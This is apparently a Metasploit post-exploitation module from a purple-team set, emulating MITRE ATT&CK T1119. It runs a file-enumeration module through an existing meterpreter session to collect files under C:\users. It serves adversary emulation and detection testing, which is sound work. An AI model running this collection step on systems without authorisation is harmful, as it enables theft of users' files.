##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Automated Collection (T1119) Windows - Purple Team',
                      'Description'   => %q{
                        Collection:
                        Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of Scripting to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. },
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1119' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new("MODULE", [ true, "Module to execute", 'post/windows/gather/enum_files']),
      OptString.new("SEARCH_FROM", [false, "Search from a specific location", 'C:\\users']),
      OptString.new("FILE_GLOBS", [false, "File pattern to search for in a filename", 'txt'])
    ])
  end

  def run_module(mod)
      framework_mod = framework.modules.create(mod)
      framework_mod.datastore['SESSION'] = datastore['SESSION']
      framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
      framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
      framework_mod.datastore['SEARCH_FROM'] = datastore['SEARCH_FROM'] unless datastore["SEARCH_FROM"] == ''
      framework_mod.datastore['FILE_GLOBS'] = datastore['FILE_GLOBS'] unless datastore["FILE_GLOBS"] == ''
      framework_mod.run_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'RunAsJob'  => false,
          'RaiseExceptions' => true,
          )
  end

  def run
    begin
      raise "Module requires meterpreter session" if session.type != "meterpreter"

      mod = datastore['MODULE']
      print_status("Executing '#{mod}' on #{session.inspect}")
      run_module(mod)

      print_good("Module T1119W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1119W execution failed.")
    end
   end
end
